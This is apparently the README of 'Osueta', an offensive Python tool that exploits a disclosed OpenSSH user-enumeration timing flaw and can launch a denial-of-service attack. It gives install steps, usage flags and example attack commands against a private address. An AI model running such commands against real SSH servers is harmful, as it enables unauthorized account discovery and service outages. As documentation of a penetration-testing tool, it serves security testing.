        ***************************************************************************
        *                  ___                 ___ ___ _  _                       *
        *                 / _ \ _ __  ___ _ _ / __/ __| || |                      *
        *                | (_) | '_ \/ -_) ' \\__ \__ \ __ |                      *
        *                 \___/| .__/\___|_||_|___/___/_||_|                      *
        *                      |_|                                                *
        *   _   _               ___                             _   _             *
        *  | | | |___ ___ _ _  | __|_ _ _  _ _ __  ___ _ _ __ _| |_(_)___ _ _     *
        *  | |_| (_-</ -_) '_| | _|| ' \ || | '  \/ -_) '_/ _` |  _| / _ \ ' \    *
        *   \___//__/\___|_|   |___|_||_\_,_|_|_|_\___|_| \__,_|\__|_\___/_||_|   *
        *                                                                         *
        *          _____ _       _               _  _   _           _             *
        *         |_   _(_)_ __ (_)_ _  __ _    /_\| |_| |_ __ _ __| |__          *
        *           | | | | '  \| | ' \/ _` |  / _ \  _|  _/ _` / _| / /          *
        *           |_| |_|_|_|_|_|_||_\__, | /_/ \_\__|\__\__,_\__|_\_\          *
        *                              |___/                                      *
        ***************************************************************************


What's OSUETA?
==============

        Osueta it's a simple Python script to exploit the OpenSSH User Enumeration Timing Attack, 
        present in OpenSSh versions 5.* and 6.*. The script has the ability to make variations
        of the username employed in the bruteforce attack, and the possibility to establish
        a DOS condition in the OpenSSh server. 

        http://cureblog.de/openssh-user-enumeration-time-based-attack/
        http://seclists.org/fulldisclosure/2013/Jul/88 
        http://www.devconsole.info/?p=381
        http://www.devconsole.info/?p=382

Advice:
=======

	Like others offensive tools, the authors disclaims all responsibility in the use of this script.


Installing:
===========

        # apt-get install python-ipy python-nmap python-paramiko
        git clone https://github.com/c0r3dump3d/osueta.git 


Usage:
======

	usage: osueta.py [-h] [-H HOST] [-p PORT] [-L UFILE] [-U USER] [-d DELAY]
                 [-v VARI] [--dos DOS] [-t THREADS]

	OpenSSH User Enumeration Time-Based Attack

	optional arguments:
  	-h, --help  show this help message and exit
  	-H HOST     Host to attack
  	-p PORT     Host port
  	-L UFILE    Username list file
  	-U USER     Only use a single username
  	-d DELAY    Time delay in seconds
  	-v VARI     Make variations of the username (default yes)
  	--dos DOS   Try to make a DOS attack (default no)
  	-t THREADS  Threads for the DOS attack (default 5)

Example:
========

	* A single user enumeration attempt with username variations:

	        ./osueta.py -H 192.168.1.6 -p 22 -U root -d 30 -v yes

	* A single user enumeration attempt with no user variations a dos attack:

		
	        ./osueta.py -H 192.168.1.6 -p 22 -U root -d 30 -v no --dos yes

Authors:
========

        c0r3dump | coredump<@>autistici.org
        rofen | rofen<@>gmx.de

